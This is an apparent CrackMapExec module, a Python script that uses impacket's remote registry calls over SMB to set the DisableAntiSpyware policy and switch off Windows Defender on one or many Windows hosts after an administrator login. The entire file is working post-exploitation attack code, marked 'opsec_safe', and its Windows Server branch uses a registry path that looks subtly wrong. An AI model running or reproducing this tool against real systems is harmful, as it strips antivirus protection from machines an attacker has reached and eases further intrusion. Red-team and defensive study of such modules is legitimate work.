#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author:
# Luis Otero ( zero3xplo1it - @luisotedomin)

from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from sys import exit

class CMEModule:

    name = 'disable_defender'
    description = 'Disables Windows Defender via SMB'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            ACTION Disable Defender on Windows or Windows Server (choices: w, ws)
        '''
        if not 'ACTION' in module_options:
            context.log.error('ACTION option not specified!')
            exit(1)

        if module_options['ACTION'].lower() not in ['w', 'ws']:
            context.log.error('Invalid value for ACTION option!')
            exit(1)
        self.action = module_options['ACTION'].lower()

    def on_admin_login(self, context, connection):
        if self.action == 'w':
            self.disable_defender(context,connection.conn)
        elif self.action == 'ws':
            self.disable_defender_ws(context,connection.conn)

    def disable_defender(self, context, smbconnection):
        remoteOps = RemoteOperations(smbconnection, False)
        remoteOps.enableRegistry()

        ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
        regHandle = ans['phKey']

        ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
        keyHandle = ans['phkResult']

        rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00',  rrp.REG_DWORD, 1)

        rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00')

        if int(data) == 1:
            context.log.success('Windows Defender disabled successfully')

        try:
            remoteOps.finish()
        except:
            pass
    def disable_defender_ws(self, context, smbconnection):
        remoteOps = RemoteOperations(smbconnection, False)
        remoteOps.enableRegistry()

        ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
        regHandle = ans['phKey']

        ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender')
        keyHandle = ans['phkResult']

        rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00',  rrp.REG_DWORD, 1)

        rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00')

        if int(data) == 1:
            context.log.success('Windows Defender disabled successfully')

        try:
            remoteOps.finish()
        except:
            pass

    